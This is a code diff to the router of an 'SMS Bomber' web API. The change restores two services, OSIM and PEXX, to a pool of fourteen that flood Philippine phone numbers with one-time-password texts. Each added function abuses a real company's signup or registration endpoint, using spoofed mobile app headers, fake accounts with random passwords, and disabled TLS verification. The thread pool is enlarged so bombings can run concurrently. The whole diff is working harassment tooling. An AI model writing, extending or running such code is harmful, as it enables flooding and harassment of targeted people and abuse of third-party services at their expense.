@@ -1,17 +1,16 @@
 """
 routers/sms.py — SMS Bomber API endpoint
 
-12 ACTIVE services (ported directly from the working Xissin Telegram bot main.py)
-Philippine numbers only: 9XXXXXXXXX format
+14 services total — Philippine numbers only: 9XXXXXXXXX format
 
-REMOVED (confirmed 0% success rate from bot screenshot):
-  - BOMB OTP  (OSIM foreign server — dead endpoint)
-  - PEXX      (tRPC API — rate-blocked / broken)
-
-ACTIVE (confirmed 100% success rate):
+ACTIVE (12 confirmed 100% working from bot screenshot):
   EZLOAN, XPRESS PH, EXCELLENT LENDING, BISTRO,
   BAYAD CENTER, LBC CONNECT, PICKUP COFFEE, HONEY LOAN,
   KUMU PH, S5.COM, CASHALO, MWELL
+
+RESTORED (kept from original sms.py — may vary by server/IP):
+  BOMB OTP (OSIM — register endpoint)
+  PEXX     (tRPC signup OTP)
 """
 
 from fastapi import APIRouter, HTTPException, Request
@@ -42,9 +41,9 @@ _active_users:     set = set()
 _active_users_lock      = threading.Lock()
 
 # ── Shared thread pool ────────────────────────────────────────────────────────
-# 12 services x 2 concurrent bomb headroom = 24 workers
+# 14 services x 2 concurrent bomb headroom = 28 workers
 _SERVICE_POOL = ThreadPoolExecutor(
-    max_workers=24,
+    max_workers=28,
     thread_name_prefix="sms-worker",
 )
 
@@ -116,7 +115,42 @@ def _short_err(e: Exception) -> str:
     return msg[:50]
 
 
-# ── Service functions (exact logic from working main.py) ──────────────────────
+# ── Service functions ─────────────────────────────────────────────────────────
+
+def _send_bomb_otp(phone: str):
+    """OSIM / Bomb OTP — register endpoint triggers OTP (restored from original sms.py)."""
+    try:
+        p = _fmt(phone)
+        headers = {
+            "User-Agent":      "OSIM/1.55.0 (Android 13; CPH2465; OP5958L1; arm64-v8a)",
+            "Accept":          "application/json",
+            "Accept-Encoding": "gzip",
+            "Content-Type":    "application/json; charset=utf-8",
+            "accept-language": "en-SG",
+            "region":          "PH",
+        }
+        data = {
+            "userName":  p,
+            "phoneCode": "63",
+            "password":  f"TempPass{random.randint(1000, 9999)}!",
+        }
+        r = requests.post(
+            "https://prod.services.osim-cloud.com/identity/api/v1.0/account/register",
+            headers=headers, json=data, timeout=10, verify=False,
+        )
+        if r.status_code in (200, 201):
+            try:
+                rj = r.json()
+                rc = rj.get("resultCode", 0)
+                if rc in [200000, 201000, 200, 201, 0] or r.status_code == 200:
+                    return True, "OTP triggered"
+                return False, rj.get("message", f"Code {rc}")[:50]
+            except Exception:
+                return True, "OTP triggered"
+        return False, f"HTTP {r.status_code}"
+    except Exception as e:
+        return False, _short_err(e)
+
 
 def _send_ezloan(phone: str):
     """EZLoan PH — OTP via registration gateway."""
@@ -645,9 +679,52 @@ def _send_mwell(phone: str):
         return False, _short_err(e)
 
 
-# ── Service registry (12 active, all confirmed 100% working) ─────────────────
+def _send_pexx(phone: str):
+    """PEXX — signup OTP via tRPC batch API (restored from original sms.py)."""
+    try:
+        p = _fmt(phone)
+        headers = {
+            "User-Agent":      "okhttp/4.12.0",
+            "Accept-Encoding": "gzip",
+            "Content-Type":    "application/json",
+            "x-msession-id":   "undefined",
+            "tid":             _rstr(11),
+            "appversion":      "3.0.14",
+        }
+        data = {
+            "0": {
+                "json": {
+                    "email":      "",
+                    "areaCode":   "+63",
+                    "phone":      f"+63{p}",
+                    "otpChannel": "TG",
+                    "otpUsage":   "REGISTRATION",
+                }
+            }
+        }
+        r = requests.post(
+            "https://api.pexx.com/api/trpc/auth.sendSignupOtp?batch=1",
+            headers=headers, json=data, timeout=20, verify=False,
+        )
+        if r.status_code == 200:
+            try:
+                rj = r.json()
+                if isinstance(rj, list) and rj:
+                    result = rj[0].get("result", {}).get("data", {}).get("json", {})
+                    if result.get("code") == 200:
+                        return True, "OTP sent"
+                    return False, result.get("msg", "Unknown error")[:50]
+            except Exception:
+                return True, "OTP sent"
+        return False, f"HTTP {r.status_code}"
+    except Exception as e:
+        return False, _short_err(e)
+
+
+# ── Service registry (14 total) ───────────────────────────────────────────────
 
 _SERVICES = [
+    ("BOMB OTP",          _send_bomb_otp),
     ("EZLOAN",            _send_ezloan),
     ("XPRESS PH",         _send_xpress),
     ("EXCELLENT LENDING", _send_excellent_lending),
@@ -660,6 +737,7 @@ _SERVICES = [
     ("S5.COM",            _send_s5),
     ("CASHALO",           _send_cashalo),
     ("MWELL",             _send_mwell),
+    ("PEXX",              _send_pexx),
 ]
 
 # ── Endpoints ─────────────────────────────────────────────────────────────────
